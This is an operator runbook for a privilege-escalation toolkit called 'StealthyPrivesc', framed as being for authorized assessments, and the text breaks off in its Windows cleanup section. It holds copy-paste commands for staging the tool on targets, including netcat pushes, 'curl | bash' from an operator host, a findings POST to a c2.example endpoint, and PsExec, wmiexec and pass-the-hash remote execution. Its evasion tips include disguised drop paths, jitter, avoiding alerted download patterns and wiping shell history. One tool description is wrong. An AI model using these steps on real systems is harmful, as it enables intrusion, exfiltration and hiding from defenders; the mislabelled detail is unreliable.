# Operator Runbook

Copy-paste deployment and execution guide for **authorized** assessments only.

Related docs: [`README.md`](../README.md) · [`build.md`](build.md) · [`techniques.md`](techniques.md) · [`first-user-journey.md`](first-user-journey.md)

---

## 0. Pre-flight (do this every time)

1. Confirm written Rules of Engagement (ROE) cover local privilege-escalation enumeration on the target host(s).
2. Confirm evidence handling: memory-only vs sealed file vs operator-controlled remote.
3. Prefer **enumerate-only**. Enable `--auto-exploit` only when ROE allows reversible write probes.
4. Never run this tool against systems you are not authorized to assess.

Authorization gate (required for the Rust binary):

```bash
# flag form
--i-understand-authorized-use-only

# or environment form
export STEALTHY_AUTHORIZED=1          # Linux / macOS / Git Bash
set STEALTHY_AUTHORIZED=1             # Windows cmd
$env:STEALTHY_AUTHORIZED = "1"        # Windows PowerShell
```

Without the gate, the binary exits with code `2`.

---

## 1. Build matrix (operator workstation)

Run these on your **build** machine, not necessarily on the target.

### 1.1 Native Linux x86_64

```bash
cd /path/to/StealthyPrivesc
cargo build -p stealthy --release
ls -la target/release/stealthy
./target/release/stealthy --help
./target/release/stealthy disclaimer
```

Artifact: `target/release/stealthy`

### 1.2 Linux aarch64 (cross from x86_64 Linux)

```bash
rustup target add aarch64-unknown-linux-gnu
# Debian/Ubuntu example linker package:
# sudo apt-get install -y gcc-aarch64-linux-gnu
cargo build -p stealthy --release --target aarch64-unknown-linux-gnu
ls -la target/aarch64-unknown-linux-gnu/release/stealthy
```

Artifact: `target/aarch64-unknown-linux-gnu/release/stealthy`

### 1.3 Windows x64 from Linux (MinGW)

```bash
rustup target add x86_64-pc-windows-gnu
# Debian/Ubuntu:
# sudo apt-get install -y mingw-w64
cargo build -p stealthy --release --target x86_64-pc-windows-gnu
ls -la target/x86_64-pc-windows-gnu/release/stealthy.exe
```

Artifact: `target/x86_64-pc-windows-gnu/release/stealthy.exe`

### 1.4 Native Windows (MSVC or GNU toolchain on Windows)

```powershell
cd C:\path\to\StealthyPrivesc
cargo build -p stealthy --release
dir .\target\release\stealthy.exe
.\target\release\stealthy.exe --help
.\target\release\stealthy.exe disclaimer
```

Artifact: `target\release\stealthy.exe`

### 1.5 Package a minimal drop bundle

Linux packaging:

```bash
STAGE=release-staging/stealthy-linux-x64
rm -rf "$STAGE" && mkdir -p "$STAGE/scripts/linux" "$STAGE/docs"
cp target/release/stealthy "$STAGE/"
cp scripts/linux/enum.sh scripts/linux/enum.py "$STAGE/scripts/linux/"
cp README.md docs/operator-runbook.md docs/techniques.md "$STAGE/docs/"
chmod +x "$STAGE/stealthy" "$STAGE/scripts/linux/"*
tar -C release-staging -czf stealthy-linux-x64.tar.gz stealthy-linux-x64
sha256sum stealthy-linux-x64.tar.gz
```

Windows packaging (from Linux after cross-build):

```bash
STAGE=release-staging/stealthy-windows-x64
rm -rf "$STAGE" && mkdir -p "$STAGE/scripts/windows" "$STAGE/docs"
cp target/x86_64-pc-windows-gnu/release/stealthy.exe "$STAGE/"
cp scripts/windows/enum.ps1 scripts/windows/enum.js scripts/windows/EnumTasks.csproj "$STAGE/scripts/windows/"
cp README.md docs/operator-runbook.md docs/techniques.md "$STAGE/docs/"
(cd release-staging && zip -r ../stealthy-windows-x64.zip stealthy-windows-x64)
sha256sum stealthy-windows-x64.zip
```

---

## 2. Deploy to a Linux target

### 2.0 Placeholders and drop-path choices

```bash
TARGET='user@10.0.0.20'          # or user@host
SSH_PORT=22
IDENTITY="$HOME/.ssh/id_ed25519" # optional
JUMP='bastion.example'           # optional ProxyJump
REMOTE_DIR='/tmp/.cache-update'  # change per ROE
BIN_LOCAL='target/release/stealthy'
EXPECTED_SHA256='REPLACE_WITH_sha256sum_OUTPUT'
```

| Drop path | Pros | Cons |
| --- | --- | --- |
| `/tmp/...` | Usually writable | Often cleaned, sometimes `noexec`, heavily monitored |
| `/dev/shm/...` | tmpfs, fast, often exec-ok | Lost on reboot; may be watched |
| `$HOME/.cache/...` | Looks more “user-like” | Survives longer if you forget cleanup |
| Existing tool dir already in ROE | Least surprising | Must already be approved |

Always prefer a path allowed by ROE. If the mount is `noexec`, use **script-only** deploy (section 2.12) instead of forcing a binary.

**Method chooser**

| Situation | Prefer |
| --- | --- |
| Normal SSH file copy | 2.1 SCP / 2.2 rsync / 2.3 SFTP |
| Jump host / bastion | 2.4 ProxyJump |
| No SCP but SSH shell works | 2.5 SSH stdin pipe |
| Egress to operator HTTP allowed | 2.6 HTTP(S) pull |
| Broken SCP, raw TCP allowed briefly | 2.7 netcat / socat |
| Shared NFS/SMB mount | 2.8 mount copy |
| Container / adjacent host access | 2.9 docker cp / kubectl cp |
| Interactive only / tiny channel | 2.10 base64 paste / split |
| Custom ELF blocked or `noexec` | 2.12 script-only |

After every binary drop, run **2.13 verify**.

### 2.1 SCP single binary

```bash
ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" "mkdir -p '$REMOTE_DIR'"
scp -P "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} \
  "$BIN_LOCAL" "$TARGET:$REMOTE_DIR/stealthy"
ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" \
  "chmod 750 '$REMOTE_DIR/stealthy' && '$REMOTE_DIR/stealthy' --help"
```

Preserve times/mode:

```bash
scp -p -P "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} \
  "$BIN_LOCAL" "$TARGET:$REMOTE_DIR/stealthy"
```

### 2.2 rsync over SSH (resume-friendly)

```bash
ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" "mkdir -p '$REMOTE_DIR'"
rsync -avP -e "ssh -p $SSH_PORT ${IDENTITY:+-i $IDENTITY}" \
  "$BIN_LOCAL" "$TARGET:$REMOTE_DIR/stealthy"
ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" \
  "chmod 750 '$REMOTE_DIR/stealthy'"
```

Full bundle:

```bash
rsync -avP -e "ssh -p $SSH_PORT ${IDENTITY:+-i $IDENTITY}" \
  release-staging/stealthy-linux-x64/ "$TARGET:$REMOTE_DIR/"
```

### 2.3 SFTP batch

```bash
sftp -P "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} -b - "$TARGET" <<EOF
mkdir $REMOTE_DIR
cd $REMOTE_DIR
put $BIN_LOCAL stealthy
chmod 750 stealthy
bye
EOF
```

Interactive:

```bash
sftp -P "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET"
# mkdir /tmp/.cache-update
# put target/release/stealthy stealthy
# chmod 750 stealthy
# bye
```

### 2.4 SCP / SSH via ProxyJump (bastion)

```bash
ssh -J "$JUMP" -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" "mkdir -p '$REMOTE_DIR'"
scp -o "ProxyJump=$JUMP" -P "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} \
  "$BIN_LOCAL" "$TARGET:$REMOTE_DIR/stealthy"
```

`~/.ssh/config` form:

```sshconfig
Host target-prod
  HostName 10.0.0.20
  User user
  Port 22
  IdentityFile ~/.ssh/id_ed25519
  ProxyJump bastion.example
```

```bash
scp "$BIN_LOCAL" target-prod:"$REMOTE_DIR/stealthy"
ssh target-prod "chmod 750 $REMOTE_DIR/stealthy && $REMOTE_DIR/stealthy --help"
```

### 2.5 SSH stdin pipe (no SCP binary required on PATH)

Raw bytes (fastest):

```bash
ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" \
  "mkdir -p '$REMOTE_DIR' && cat > '$REMOTE_DIR/stealthy' && chmod 750 '$REMOTE_DIR/stealthy'" \
  < "$BIN_LOCAL"
```

With remote checksum printback:

```bash
ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" \
  "mkdir -p '$REMOTE_DIR' && cat > '$REMOTE_DIR/stealthy' && chmod 750 '$REMOTE_DIR/stealthy' && sha256sum '$REMOTE_DIR/stealthy'" \
  < "$BIN_LOCAL"
```

Gzip to shrink transfer:

```bash
gzip -c "$BIN_LOCAL" | ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" \
  "mkdir -p '$REMOTE_DIR' && gzip -dc > '$REMOTE_DIR/stealthy' && chmod 750 '$REMOTE_DIR/stealthy'"
```

### 2.6 HTTP(S) pull on target

Operator listener (approved channel only):

```bash
cd release-staging
python3 -m http.server 8000 --bind 0.0.0.0
# better: bind to VPN/tun address only, e.g. --bind 10.8.0.1
```

Target pull options:

```bash
REMOTE_DIR=/tmp/.cache-update
URL='http://OPERATOR:8000/stealthy-linux-x64/stealthy'
mkdir -p "$REMOTE_DIR"

# curl
curl -fsSL "$URL" -o "$REMOTE_DIR/stealthy"

# wget
wget -q -O "$REMOTE_DIR/stealthy" "$URL"

# busybox wget
busybox wget -q -O "$REMOTE_DIR/stealthy" "$URL"

# python3 only
python3 - <<PY
from urllib.request import urlretrieve
urlretrieve("$URL", "$REMOTE_DIR/stealthy")
PY

chmod 750 "$REMOTE_DIR/stealthy"
"$REMOTE_DIR/stealthy" --help
```

HTTPS with a lab self-signed cert (expect TLS warnings unless you pin CA):

```bash
curl -fsSL --cacert /path/to/lab-ca.pem \
  "https://OPERATOR:8443/stealthy-linux-x64/stealthy" \
  -o "$REMOTE_DIR/stealthy"
```

Pull tarball then extract:

```bash
curl -fsSL "http://OPERATOR:8000/stealthy-linux-x64.tar.gz" -o /tmp/s.tgz
tar -xzf /tmp/s.tgz -C /tmp
chmod 750 /tmp/stealthy-linux-x64/stealthy
```

### 2.7 netcat / socat raw push

**Noisy / short-lived.** Use only when SSH file copy is unavailable and ROE allows ephemeral listeners.

On target:

```bash
REMOTE_DIR=/tmp/.cache-update
mkdir -p "$REMOTE_DIR"
# prefer a high ephemeral port approved for the engagement
nc -l -p 4444 > "$REMOTE_DIR/stealthy"
# or: socat -u TCP-LISTEN:4444,reuseaddr CREATE:"$REMOTE_DIR/stealthy"
chmod 750 "$REMOTE_DIR/stealthy"
```

On operator:

```bash
nc TARGET_IP 4444 < target/release/stealthy
# or: socat -u FILE:target/release/stealthy TCP:TARGET_IP:4444
```

Reverse direction (target pulls from operator listener):

```bash
# operator
nc -l -p 4444 < target/release/stealthy
# target
nc OPERATOR_IP 4444 > "$REMOTE_DIR/stealthy"
```

### 2.8 Shared mount (NFS / SMB / SSHFS)

```bash
# SSHFS from operator (mount target dir locally, then cp)
mkdir -p /mnt/target-drop
sshfs "$TARGET:$REMOTE_DIR" /mnt/target-drop
cp -a "$BIN_LOCAL" /mnt/target-drop/stealthy
fusermount -u /mnt/target-drop   # or: umount /mnt/target-drop
ssh "$TARGET" "chmod 750 '$REMOTE_DIR/stealthy'"
```

If an NFS/SMB share is already mounted on both sides:

```bash
cp -a target/release/stealthy /mnt/engagement-share/stealthy
ssh "$TARGET" 'cp /mnt/engagement-share/stealthy '"$REMOTE_DIR"'/stealthy && chmod 750 '"$REMOTE_DIR"'/stealthy'
```

### 2.9 Container / Kubernetes adjacent copy

Docker (host has access to container):

```bash
docker cp target/release/stealthy CONTAINER_ID:/tmp/stealthy
docker exec CONTAINER_ID chmod 750 /tmp/stealthy
docker exec -it CONTAINER_ID /tmp/stealthy --help
```

kubectl:

```bash
kubectl cp target/release/stealthy NAMESPACE/POD:/tmp/stealthy
kubectl exec -n NAMESPACE POD -- chmod 750 /tmp/stealthy
kubectl exec -n NAMESPACE POD -- /tmp/stealthy --help
```

### 2.10 Base64 paste / split files (constrained channels)

Build host:

```bash
base64 -w0 target/release/stealthy > /tmp/stealthy.b64
wc -c /tmp/stealthy.b64
# optional split for chat/ticket paste limits
split -b 500k /tmp/stealthy.b64 /tmp/stealthy.b64.part.
ls /tmp/stealthy.b64.part.*
```

Target reassembly:

```bash
cat stealthy.b64.part.* > stealthy.b64
base64 -d stealthy.b64 > "$REMOTE_DIR/stealthy"
chmod 750 "$REMOTE_DIR/stealthy"
```

Interactive heredoc:

```bash
base64 -d > "$REMOTE_DIR/stealthy" <<'B64'
PASTE_BASE64_HERE
B64
chmod 750 "$REMOTE_DIR/stealthy"
```

`xxd` hex alternative when `base64` is missing:

```bash
# build host
xxd -p target/release/stealthy > /tmp/stealthy.hex
# target
xxd -r -p stealthy.hex > "$REMOTE_DIR/stealthy"
chmod 750 "$REMOTE_DIR/stealthy"
```

### 2.11 SCP full tarball / ansible-style loop

Tarball:

```bash
scp -P "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} \
  stealthy-linux-x64.tar.gz "$TARGET:/tmp/"
ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" 'set -e
  cd /tmp
  tar -xzf stealthy-linux-x64.tar.gz
  cd stealthy-linux-x64
  chmod 750 stealthy scripts/linux/*
  ./stealthy disclaimer
'
```

Multiple hosts:

```bash
for h in user@10.0.0.21 user@10.0.0.22 user@10.0.0.23; do
  echo "== $h =="
  ssh "$h" "mkdir -p '$REMOTE_DIR'"
  scp "$BIN_LOCAL" "$h:$REMOTE_DIR/stealthy"
  ssh "$h" "chmod 750 '$REMOTE_DIR/stealthy' && sha256sum '$REMOTE_DIR/stealthy'"
done
```

### 2.12 Script-only deploy (no custom ELF)

When AppArmor/`noexec`/policy blocks the binary:

```bash
scp scripts/linux/enum.sh scripts/linux/enum.py "$TARGET:$REMOTE_DIR/"
ssh "$TARGET" "chmod 750 $REMOTE_DIR/enum.sh $REMOTE_DIR/enum.py; bash $REMOTE_DIR/enum.sh"
ssh "$TARGET" "python3 $REMOTE_DIR/enum.py"
```

No disk scripts (stdin only):

```bash
ssh "$TARGET" 'bash -s' < scripts/linux/enum.sh
ssh "$TARGET" 'python3 -' < scripts/linux/enum.py
```

Curl-pipe (only from an operator URL you control; still leaves process cmdline artifacts):

```bash
curl -fsSL "http://OPERATOR:8000/enum.sh" | bash
curl -fsSL "http://OPERATOR:8000/enum.py" | python3 -
```

### 2.13 Post-deploy verify (Linux)

```bash
ssh "$TARGET" "set -e
  f='$REMOTE_DIR/stealthy'
  ls -la \"\$f\"
  file \"\$f\"
  sha256sum \"\$f\"
  \"\$f\" --help >/dev/null
  \"\$f\" disclaimer | head -n 5
"
# compare printed hash to:
sha256sum "$BIN_LOCAL"
```

`noexec` quick test:

```bash
ssh "$TARGET" "$REMOTE_DIR/stealthy --help" \
  || echo 'EXEC FAILED — switch to script-only (2.12)'
```

---

## 3. Run on a Linux target

Assume binary is at `$BIN` (example `/tmp/.cache-update/stealthy`).

### 3.1 First safe run (enumerate only, memory output)

```bash
BIN=/tmp/.cache-update/stealthy
"$BIN" guide
"$BIN" disclaimer
"$BIN" --authorized list-plugins
"$BIN" --authorized enum
```

Quiet / high-signal / machine formats:

```bash
STEALTHY_AUTHORIZED=1 "$BIN" -q enum
STEALTHY_AUTHORIZED=1 "$BIN" --no-color enum --min-severity high
STEALTHY_AUTHORIZED=1 "$BIN" --format json -q enum > findings.json
STEALTHY_AUTHORIZED=1 "$BIN" --format markdown enum > report.md
```

### 3.2 Plugin selection

```bash
STEALTHY_AUTHORIZED=1 "$BIN" enum \
  --plugins linux.sudo,linux.suid,linux.containers,linux.groups,linux.credentials

STEALTHY_AUTHORIZED=1 "$BIN" enum \
  --skip linux.suid,linux.wildcard_cron
```

### 3.3 Low-and-slow

```bash
STEALTHY_AUTHORIZED=1 "$BIN" --delay-ms 200 enum
STEALTHY_AUTHORIZED=1 "$BIN" --delay-ms 0 enum   # disable jitter
```

### 3.4 Sealed file output

```bash
OUT=/tmp/findings.seal
STEALTHY_AUTHORIZED=1 "$BIN" \
  --output file --output-path "$OUT" \
  enum
# Binary prints the decrypt key to stderr — capture/store per ROE.
ls -la "$OUT"
```

Plaintext JSON (explicit; noisier on disk):

```bash
STEALTHY_AUTHORIZED=1 "$BIN" \
  --output file --output-path /tmp/findings.json \
  --plaintext-file \
  enum
```

### 3.5 Remote output mode (operator-driven in v1)

v1 does **not** silently POST. It prints a sealed blob and key for the operator to transmit on an approved channel:

```bash
STEALTHY_AUTHORIZED=1 STEALTHY_EXFIL_URL='https://c2.example/intake' \
  "$BIN" --output remote --exfil-url "$STEALTHY_EXFIL_URL" enum
```

Example operator follow-up (only on approved infra):

```bash
# After capturing SEALED_B64 and KEY_HEX from tool output:
curl -fsS -X POST "https://c2.example/intake" \
  -H 'Content-Type: text/plain' \
  --data-binary "$SEALED_B64"
```

### 3.6 Limited auto-exploit (ROE required)

```bash
STEALTHY_AUTHORIZED=1 "$BIN" enum --auto-exploit
```

Still blocked: kernel exploits, service binary replacement, persistence without consent.

### 3.7 Script fallback execution

```bash
bash /tmp/enum.sh | tee /tmp/enum-shell.txt
python3 /tmp/enum.py | tee /tmp/enum-python.txt
```

### 3.8 Linux cleanup

```bash
BIN=/tmp/.cache-update/stealthy
rm -f "$BIN" /tmp/findings.seal /tmp/findings.json /tmp/enum.sh /tmp/enum.py
rm -rf /tmp/stealthy-linux-x64 /tmp/stealthy-drop /tmp/.cache-update
# Optional history note: clear only if ROE/opsec plan requires and policy allows
# history -c; rm -f ~/.bash_history
```

Best-effort overwrite helper is available in-source as `secure_delete_hint` for operators extending the toolkit; default CLI does not auto-wipe.

---

## 4. Deploy to a Windows target

### 4.0 Placeholders and drop-path choices

```bash
# Operator-side (Linux/macOS) placeholders
TARGET='user@10.0.0.30'
WIN_EXE_LOCAL='target/x86_64-pc-windows-gnu/release/stealthy.exe'
REMOTE_DIR='C:/Users/Public/Documents/cache-update'   # SCP/OpenSSH style
REMOTE_DIR_WIN='C:\Users\Public\Documents\cache-update' # native Windows style
EXPECTED_SHA256='REPLACE_WITH_sha256sum_OUTPUT'
```

| Drop path | Pros | Cons |
| --- | --- | --- |
| `C:\Users\Public\Documents\...` | Usually writable for standard users | Shared; other users may see it |
| `%TEMP%\...` / `C:\Users\<you>\AppData\Local\Temp\...` | Common for tools | Cleaners / EDR may scrutinize |
| `%LOCALAPPDATA%\...` | User-scoped | Persists until removed |
| Admin share `\\HOST\C$\...` | Convenient from Windows ops host | Needs admin rights; very visible in logs |

**Method chooser**

| Situation | Prefer |
| --- | --- |
| Windows OpenSSH available | 4.1 SCP / SSH pipe |
| Domain admin workstation + admin share | 4.2 SMB / `Copy-Item` / `net use` |
| WinRM enabled | 4.3 PowerShell remoting |
| Target can reach operator HTTP | 4.4 `Invoke-WebRequest` / `curl.exe` / BITS |
| RDP session | 4.5 drive redirect / clipboard / TS client share |
| Need remote service create / interactive cmd (high noise) | 4.6 PsExec-style |
| Impacket / remote Windows tooling on Linux | 4.7 smbclient.py / evil-winrm / psexec.py |
| Text-only channel | 4.8 certutil / FromBase64String |
| Custom `.exe` blocked (AppLocker/WDAC) | 4.10 script-only |
| Need integrity check | 4.11 verify |

### 4.1 SCP / OpenSSH on Windows

From Linux/macOS:

```bash
ssh "$TARGET" "powershell -NoProfile -Command \"New-Item -ItemType Directory -Force -Path '$REMOTE_DIR_WIN' | Out-Null\""
scp "$WIN_EXE_LOCAL" "$TARGET:$REMOTE_DIR/stealthy.exe"
scp scripts/windows/enum.ps1 scripts/windows/enum.js scripts/windows/EnumTasks.csproj \
  "$TARGET:$REMOTE_DIR/"
ssh "$TARGET" "powershell -NoProfile -Command \"& '$REMOTE_DIR_WIN\\stealthy.exe' --help\""
```

SSH + PowerShell decode from stdin (when `scp` is unavailable):

```bash
ssh "$TARGET" "powershell -NoProfile -Command \"New-Item -ItemType Directory -Force -Path '$REMOTE_DIR_WIN' | Out-Null\""
# Stream base64 on stdin; decode on target (avoids argv length limits)
base64 -w0 "$WIN_EXE_LOCAL" | ssh "$TARGET" "powershell -NoProfile -Command \"\$d=[Console]::In.ReadToEnd(); [IO.File]::WriteAllBytes('$REMOTE_DIR_WIN\\stealthy.exe',[Convert]::FromBase64String(\$d.Trim()))\""
```

For multi-megabyte drops, prefer `scp` / SMB / HTTP (4.1–4.4) over stdin encoding.

Zip bundle:

```bash
scp stealthy-windows-x64.zip "$TARGET:C:/Users/Public/Documents/"
ssh "$TARGET" 'powershell -NoProfile -Command "Expand-Archive -Force -Path C:\Users\Public\Documents\stealthy-windows-x64.zip -DestinationPath C:\Users\Public\Documents\cache-update"'
```

### 4.2 SMB admin share / mapped drive

From a **Windows** operator workstation:

```powershell
$HostName = 'TARGET'
$Dir = "\\$HostName\C$\Users\Public\Documents\cache-update"
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
Copy-Item .\target\release\stealthy.exe "$Dir\stealthy.exe" -Force
Copy-Item .\scripts\windows\* $Dir -Force
Get-FileHash "$Dir\stealthy.exe" -Algorithm SHA256
```

`net use` + `copy`:

```cmd
net use Z: \\TARGET\C$ /user:DOMAIN\user *
mkdir Z:\Users\Public\Documents\cache-update
copy /Y stealthy.exe Z:\Users\Public\Documents\cache-update\stealthy.exe
copy /Y scripts\windows\* Z:\Users\Public\Documents\cache-update\
net use Z: /delete
```

From Linux with `smbclient`:

```bash
smbclient '//TARGET/C$' -U 'DOMAIN/user' -c \
  'mkdir Users\Public\Documents\cache-update; \
   put target/x86_64-pc-windows-gnu/release/stealthy.exe Users\Public\Documents\cache-update\stealthy.exe; \
   put scripts/windows/enum.ps1 Users\Public\Documents\cache-update\enum.ps1; \
   put scripts/windows/enum.js Users\Public\Documents\cache-update\enum.js'
```

Non-admin user share (if one exists):

```powershell
$Dir = '\\TARGET\ShareName\engagement\cache-update'
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
Copy-Item .\stealthy.exe "$Dir\stealthy.exe" -Force
```

### 4.3 WinRM / PowerShell remoting

Enable only if already in ROE / already configured:

```powershell
$S = New-PSSession -ComputerName TARGET -Credential (Get-Credential)
Invoke-Command -Session $S -ScriptBlock {
  New-Item -ItemType Directory -Force -Path 'C:\Users\Public\Documents\cache-update' | Out-Null
}
Copy-Item -ToSession $S -Path .\target\release\stealthy.exe \
  -Destination 'C:\Users\Public\Documents\cache-update\stealthy.exe' -Force
Copy-Item -ToSession $S -Path .\scripts\windows\* \
  -Destination 'C:\Users\Public\Documents\cache-update\' -Force
Invoke-Command -Session $S -ScriptBlock {
  & 'C:\Users\Public\Documents\cache-update\stealthy.exe' --help
}
Remove-PSSession $S
```

One-shot without keeping a session object:

```powershell
$Cred = Get-Credential
Copy-Item -Path .\stealthy.exe -Destination '\\TARGET\C$\Users\Public\Documents\cache-update\stealthy.exe' -Force
Invoke-Command -ComputerName TARGET -Credential $Cred -ScriptBlock {
  $env:STEALTHY_AUTHORIZED = '1'
  & 'C:\Users\Public\Documents\cache-update\stealthy.exe' -q enum
}
```

### 4.4 HTTP(S) / BITS / curl pull on target

Operator hosts the Windows bundle (approved channel only):

```bash
cd release-staging && python3 -m http.server 8000 --bind 10.8.0.1
```

PowerShell download:

```powershell
$Dir = 'C:\Users\Public\Documents\cache-update'
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
$Url = 'http://OPERATOR:8000/stealthy-windows-x64/stealthy.exe'
Invoke-WebRequest -Uri $Url -OutFile "$Dir\stealthy.exe" -UseBasicParsing
# Legacy:
# (New-Object Net.WebClient).DownloadFile($Url, "$Dir\stealthy.exe")
Get-FileHash "$Dir\stealthy.exe" -Algorithm SHA256
& "$Dir\stealthy.exe" --help
```

`curl.exe` (Windows 10+):

```powershell
curl.exe -fsSL -o "$Dir\stealthy.exe" $Url
```

BITS (often less “browser-like”; still logged):

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $Url -Destination "$Dir\stealthy.exe"
```

Zip pull + expand:

```powershell
$Zip = "$Dir\bundle.zip"
Invoke-WebRequest -Uri 'http://OPERATOR:8000/stealthy-windows-x64.zip' -OutFile $Zip -UseBasicParsing
Expand-Archive -Force -Path $Zip -DestinationPath $Dir
```

**Note:** `certutil -urlcache -split -f http://...` works on many hosts but is a well-known living-off-the-land download pattern and is frequently alerted — prefer `Invoke-WebRequest` / `curl.exe` / BITS when available.

### 4.5 RDP clipboard, drive redirect, and `\\tsclient`

1. Enable clipboard **or** local drive redirection in the RDP client (per ROE).
2. Copy `stealthy.exe` / zip into the redirected path.

From an RDP desktop session on the target:

```cmd
dir \\tsclient\C\path\to\stealthy.exe
mkdir C:\Users\Public\Documents\cache-update
copy /Y \\tsclient\C\path\to\stealthy.exe C:\Users\Public\Documents\cache-update\stealthy.exe
copy /Y \\tsclient\C\path\to\scripts\windows\* C:\Users\Public\Documents\cache-update\
```

PowerShell:

```powershell
Copy-Item '\\tsclient\C\path\to\stealthy.exe' 'C:\Users\Public\Documents\cache-update\stealthy.exe' -Force
```

Clipboard paste works for scripts (`enum.ps1` / `enum.js`) more reliably than large PE files.

### 4.6 PsExec-style remote create

**Risk:** High-signal on modern EDR/AV. Creates a remote service (often `PSEXESVC`), may drop a helper binary under `ADMIN$` / `%SystemRoot%`, and generates conspicuous 7045/4697 service events. Use only when ROE explicitly allows remote service execution and quieter paths (SSH/WinRM/SMB copy + local run) are unavailable or insufficient.

Prerequisites:

- Admin credentials (local admin or equivalent) on the target
- SMB access to `ADMIN$` / `C$` (TCP 445) and the ability to create/start services
- Operator binary available: Sysinternals `PsExec64.exe`, compatible `PAExec.exe`, or Impacket `psexec.py` (section also covers close cousins)

#### 4.6.1 Stage the payload first (recommended)

Prefer copying `stealthy.exe` (or scripts) via SMB, then using PsExec only to **execute** — fewer surprises than asking PsExec to both copy and run:

```powershell
$Target = 'TARGET'
$Dir = "\\$Target\C$\Users\Public\Documents\cache-update"
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
Copy-Item .\target\release\stealthy.exe "$Dir\stealthy.exe" -Force
Copy-Item .\scripts\windows\enum.ps1 "$Dir\enum.ps1" -Force
```

#### 4.6.2 Sysinternals PsExec — remote execute

```cmd
set TARGET=TARGET
set USER=DOMAIN\user
set BIN=C:\Users\Public\Documents\cache-update\stealthy.exe

:: Accept EULA once in lab tooling images if required
psexec64.exe \\%TARGET% -u %USER% -p PASSWORD -accepteula -h cmd /c "set STEALTHY_AUTHORIZED=1&& \"%BIN%\" -q enum"

:: Interactive remote shell (very noisy)
psexec64.exe \\%TARGET% -u %USER% -p PASSWORD -accepteula -h cmd.exe

:: Run as SYSTEM
psexec64.exe \\%TARGET% -u %USER% -p PASSWORD -accepteula -s -h cmd /c "set STEALTHY_AUTHORIZED=1&& \"%BIN%\" -q enum"

:: Copy+run in one shot (drops binary via ADMIN$; noisier)
psexec64.exe \\%TARGET% -u %USER% -p PASSWORD -accepteula -h -c -f .\stealthy.exe --i-understand-authorized-use-only -q enum
```

PowerShell wrapper:

```powershell
$Target = 'TARGET'
$User = 'DOMAIN\user'
$Pass = 'PASSWORD'   # prefer credential store / prompt in real ops
$RemoteBin = 'C:\Users\Public\Documents\cache-update\stealthy.exe'
& .\PsExec64.exe "\\$Target" -u $User -p $Pass -accepteula -h `
  cmd /c "set STEALTHY_AUTHORIZED=1&& `"$RemoteBin`" -q enum"
```

Script-only via PsExec when PE is blocked but `powershell.exe` is allowed:

```cmd
psexec64.exe \\TARGET -u DOMAIN\user -p PASSWORD -accepteula -h ^
  powershell -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\Documents\cache-update\enum.ps1
```

Useful flags (operator reminder):

| Flag | Meaning |
| --- | --- |
| `-h` | Elevated token if available |
| `-s` | Run as SYSTEM |
| `-c -f` | Copy local binary to target and overwrite |
| `-d` | Do not wait for process to finish |
| `-i` | Interact with a desktop session (session id optional) |

#### 4.6.3 PAExec (PsExec-compatible alternative)

```cmd
paexec.exe \\TARGET -u DOMAIN\user -p PASSWORD -h ^
  cmd /c "set STEALTHY_AUTHORIZED=1&& C:\Users\Public\Documents\cache-update\stealthy.exe -q enum"

:: copy+run
paexec.exe \\TARGET -u DOMAIN\user -p PASSWORD -h -c -f stealthy.exe --i-understand-authorized-use-only -q enum
```

#### 4.6.4 Impacket `psexec.py` / `smbexec.py` / `wmiexec.py`

From a Linux operator host (authorized tooling path only):

```bash
# Classic PsExec-like remote service + shell
psexec.py 'DOMAIN/user:PASSWORD@TARGET'

# After you already staged stealthy.exe via smbclient.py / ADMIN$:
psexec.py 'DOMAIN/user:PASSWORD@TARGET' \
  'cmd.exe /c set STEALTHY_AUTHORIZED=1&& C:\Users\Public\Documents\cache-update\stealthy.exe -q enum'

# Pass-the-hash form (when ROE allows)
psexec.py -hashes 'LMHASH:NTHASH' 'DOMAIN/user@TARGET' \
  'cmd.exe /c set STEALTHY_AUTHORIZED=1&& C:\Users\Public\Documents\cache-update\stealthy.exe -q enum'
```

Semi-interactive alternatives that still create remote execution artifacts (choose per controls):

```bash
# Service-based, less file drop than classic psexec in some setups — still noisy
smbexec.py 'DOMAIN/user:PASSWORD@TARGET'

# WMI-based remote process create (no PSEXESVC; still high-signal)
wmiexec.py 'DOMAIN/user:PASSWORD@TARGET' \
  'cmd.exe /c set STEALTHY_AUTHORIZED=1&& C:\Users\Public\Documents\cache-update\stealthy.exe -q enum'

# WinRM-based (often quieter than PsExec when WinRM is expected admin traffic)
atexec.py 'DOMAIN/user:PASSWORD@TARGET' \
  'cmd.exe /c set STEALTHY_AUTHORIZED=1&& C:\Users\Public\Documents\cache-update\stealthy.exe --output file --output-path C:\Users\Public\Documents\cache-update\findings.seal -q enum'
```

#### 4.6.5 Cleanup after PsExec-style runs

On the target (admin):

```cmd
:: Stop/remove leftover service if present (name may vary)
sc stop PSEXESVC
sc delete PSEXESVC
del /f /q C:\Windows\PSEXESVC.exe
del /f /q C:\Users\Public\Documents\cache-update\stealthy.exe
del /f /q C:\Users\Public\Documents\cache-update\findings.seal
```

```powershell
Get-Service PSEXESVC -ErrorAction SilentlyContinue | Stop-Service -Force
sc.exe delete PSEXESVC
Remove-Item -Force -ErrorAction SilentlyContinue C:\Windows\PSEXESVC.exe
